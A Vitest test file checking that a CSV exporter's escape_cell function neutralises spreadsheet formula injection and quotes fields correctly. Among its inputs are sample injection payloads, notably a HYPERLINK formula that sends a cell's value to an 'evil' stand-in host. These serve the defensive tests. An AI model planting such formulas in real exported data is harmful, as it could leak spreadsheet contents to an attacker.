import { describe, expect, test } from "vitest";
import { escape_cell } from "../csv-exporter";

describe("escape_cell", () => {
  test.each([
    ["=1+1", "'=1+1"],
    ["+1", "'+1"],
    ["-1", "'-1"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\tfoo", "'\tfoo"],
  ])("neutralises a leading formula character in %j", (input, expected) => {
    expect(escape_cell(input)).toBe(expected);
  });

  test("prefixes a leading CR, then quotes the field", () => {
    expect(escape_cell("\rfoo")).toBe(`"'\rfoo"`);
  });

  test("prefixes before quoting, so the quote lands inside the field", () => {
    expect(escape_cell('=HYPERLINK("https://x/?"&B2,"click")')).toBe(
      `"'=HYPERLINK(""https://x/?""&B2,""click"")"`
    );
  });

  test("leaves a formula character that is not leading alone", () => {
    expect(escape_cell("a=b")).toBe("a=b");
    expect(escape_cell("jane@example.com")).toBe("jane@example.com");
  });

  test("keeps numbers numeric, negatives included", () => {
    expect(escape_cell(-42.5)).toBe("-42.5");
    expect(escape_cell(0)).toBe("0");
  });

  test("still quotes commas, quotes and newlines", () => {
    expect(escape_cell("a,b")).toBe('"a,b"');
    expect(escape_cell('say "hi"')).toBe('"say ""hi"""');
    expect(escape_cell("a\nb")).toBe('"a\nb"');
  });

  test("quotes an inner CR, so a formula after it stays inside the field", () => {
    expect(escape_cell('Ann\r=HYPERLINK("https://evil/?"&A2,"Refund")')).toBe(
      `"Ann\r=HYPERLINK(""https://evil/?""&A2,""Refund"")"`
    );
    expect(escape_cell("Ann\r=1+1")).toBe('"Ann\r=1+1"');
  });

  test("quotes a CRLF inside a value", () => {
    expect(escape_cell("line one\r\nline two")).toBe('"line one\r\nline two"');
  });

  test("renders null and undefined as empty", () => {
    expect(escape_cell(null)).toBe("");
    expect(escape_cell(undefined)).toBe("");
  });
});
